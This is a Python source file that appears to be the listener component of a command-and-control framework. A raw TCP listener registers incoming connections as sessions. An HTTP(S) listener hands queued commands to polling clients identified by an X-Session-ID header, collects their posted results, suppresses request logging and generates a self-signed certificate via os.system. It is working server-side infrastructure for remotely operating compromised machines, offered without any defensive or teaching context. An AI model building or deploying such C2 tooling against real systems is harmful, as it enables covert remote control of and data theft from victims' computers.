import socket
import ssl
import threading
import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from core.session import TCPSession, HTTPSession

class TCPListener:
    def __init__(self, ip, port, session_manager):
        self.ip = ip
        self.port = port
        self.session_manager = session_manager

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.ip, self.port))
            s.listen()
            while True:
                conn, addr = s.accept()
                session = TCPSession(conn, addr)
                self.session_manager.add_session(session)

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Client polling for commands
        session_id = self.headers.get("X-Session-ID")
        if not session_id:
            # New session
            session = HTTPSession(self.client_address)
            self.server.session_manager.add_session(session)
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("X-Session-ID", str(session.id))
            self.end_headers()
            self.wfile.write(json.dumps({"type": "noop"}).encode())
            return

        try:
            session_id = int(session_id)
        except ValueError:
            self.send_response(400)
            self.end_headers()
            return
        session = self.server.session_manager.sessions.get(session_id)
        if not session:
            self.send_response(404)
            self.end_headers()
            return

        try:
            import queue
            cmd = session.command_queue.get(block=False)
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(cmd).encode())
        except queue.Empty:
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"type": "noop"}).encode())

    def do_POST(self):
        # Client sending results
        session_id = self.headers.get("X-Session-ID")
        if not session_id:
            self.send_response(400)
            self.end_headers()
            return

        try:
            session_id = int(session_id)
        except ValueError:
            self.send_response(400)
            self.end_headers()
            return
        session = self.server.session_manager.sessions.get(session_id)
        if not session:
            self.send_response(404)
            self.end_headers()
            return

        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        try:
            result = json.loads(post_data.decode())
            session.result_queue.put(result)
        except json.JSONDecodeError:
            pass

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass

class HTTPListener:
    def __init__(self, ip, port, session_manager, use_ssl=False):
        self.ip = ip
        self.port = port
        self.session_manager = session_manager
        self.use_ssl = use_ssl

    def start(self):
        server = HTTPServer((self.ip, self.port), HTTPRequestHandler)
        server.session_manager = self.session_manager
        
        if self.use_ssl:
            import os
            cert_path = "cert.pem"
            key_path = "key.pem"
            if not os.path.exists(cert_path) or not os.path.exists(key_path):
                # Generating certificate
                os.system(f"openssl req -x509 -newkey rsa:4096 -keyout {key_path} -out {cert_path} -days 365 -nodes -subj \"/CN=localhost\"")
            
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            server.socket = context.wrap_socket(server.socket, server_side=True)

        server.serve_forever()

